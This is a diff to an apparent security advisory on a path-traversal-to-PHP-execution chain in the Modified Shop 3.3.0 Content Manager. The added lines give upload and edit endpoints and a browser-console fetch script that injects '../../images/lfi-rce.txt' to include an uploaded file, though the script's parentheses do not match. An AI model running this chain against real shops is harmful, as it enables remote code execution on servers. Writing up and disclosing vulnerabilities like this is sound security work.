@@ -93,6 +93,12 @@ The application consequently includes a file located outside its intended conten
 
 ### 3. Upload and inclusion chain
 
+The file can be written to the endpoint.
+
+```
+http://192.168.100.76:8080/admin/includes/modules/filemanager/dialog.php
+```
+
 During testing, the Filemanager successfully uploaded a text file containing a harmless PHP marker:
 
 ```php
@@ -175,6 +181,42 @@ The browser-side verification returned:
 }
 ```
 
+To run this in a browser, you can save the PHP code into a `.txt` file, access the endpoint below, and execute the `fetch` code within your browser's console while authenticated.
+
+```
+http://172.25.44.135:8080/admin/content_manager.php?coID=1&coIndex=0&action=edit 
+```
+
+async () => {
+  const form = [...document.forms].find(f =>
+    f.action.includes('content_manager.php')
+  );
+
+  if (!form) {
+    console.error('Formulário do Content Manager não encontrado');
+    return;
+  }
+
+  const data = new FormData(form);
+  data.set('select_file[0][2]', '../../images/lfi-rce.txt');
+
+  const response = await fetch(form.action || location.href, {
+    method: 'POST',
+    body: data,
+    credentials: 'same-origin',
+    redirect: 'follow'
+  });
+
+  console.log({
+    status: response.status,
+    finalURL: response.url
+  });
+})();
+
+access the URL to see the PHP code being executed
+
+http://172.25.44.135:8080/shop_content.php?coID=1
+
 This confirms that the uploaded file was included by the application and its PHP code was executed.
 
 ## Security Impact
@@ -241,3 +283,4 @@ Verify that:
 The Modified Shop Content Manager contains a Path Traversal vulnerability that leads to Local File Inclusion. Because the included file is processed by PHP, the issue can also result in PHP code execution when an attacker can control or upload the contents of a file reachable through the vulnerable path.
 
 The complete upload-to-inclusion-to-PHP-execution chain was reproduced in the tested Modified Shop 3.3.0 revision 16825 environment using a harmless marker, confirming the vulnerability's impact.
+
